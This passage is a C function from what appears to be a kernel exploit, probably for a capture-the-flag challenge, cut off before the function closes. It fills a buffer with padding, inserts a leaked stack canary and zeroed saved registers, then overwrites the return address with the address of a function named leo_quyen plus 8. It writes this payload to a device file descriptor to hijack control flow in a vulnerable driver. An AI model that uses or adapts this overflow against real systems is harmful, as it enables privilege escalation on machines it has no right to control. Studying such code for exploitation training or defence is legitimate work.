void overwrite()
{
	unsigned long long payload[21] = {};
	for (int i =0;i<=15;i++)
		payload[i] = 0x6161616161616161;
	payload[16] = canary ;
	payload[17] = 0;
	payload[18] = 0;
	payload[19] = 0;
	payload[20] = (unsigned long long )leo_quyen+8;
	if (write(device_fd,payload,sizeof(payload)) <0)
	{
		puts("[!] Cannot write to device...\nExiting...");
		exit(-1);
	}
